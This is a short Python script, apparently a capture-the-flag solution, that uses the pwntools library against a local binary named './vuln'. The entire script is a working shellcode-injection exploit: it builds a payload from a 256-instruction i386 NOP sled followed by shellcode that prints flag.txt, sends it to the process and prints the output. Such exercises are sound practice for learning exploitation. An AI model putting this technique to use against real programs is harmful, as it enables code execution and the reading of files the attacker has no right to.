from pwn import *

p = process('./vuln')

payload = b''
payload += asm(shellcraft.i386.nop()*256)
payload += asm(shellcraft.i386.cat('flag.txt'))

p.sendline(payload)
print(p.recvall())
